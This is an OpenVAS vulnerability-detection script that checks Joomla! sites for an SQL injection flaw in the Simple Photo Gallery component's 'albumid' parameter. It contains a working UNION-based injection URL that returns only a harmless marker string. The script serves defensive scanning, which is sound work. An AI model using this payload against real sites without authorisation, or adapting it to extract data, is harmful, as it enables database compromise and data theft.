###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_simple_photo_gallery_sql_inj_03_15.nasl 11449 2018-09-18 10:04:42Z mmartin $
#
# Joomla! 'Simple Photo Gallery' Component 'albumid' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105243");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11449 $");

  script_name("Joomla! 'Simple Photo Gallery' Component 'albumid' Parameter SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36385/");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");

  script_tag(name:"insight", value:"Input of the 'albumid' parameter is not properly sanitized.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Joomla! Simple Photo Gallery is prone to an SQL-injection vulnerability
because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-03-24 13:13:33 +0100 (Tue, 24 Mar 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/index.php?option=com_simplephotogallery&view=images&albumid=1%20UNION%20ALL%20SELECT%20NULL,NULL,0x53514c2d496e6a656374696f6e2d54657374,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--';

if( http_vuln_check( port:port, url:url, pattern:"SQL-Injection-Test" ) )
{
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit(0);
}

exit(99);
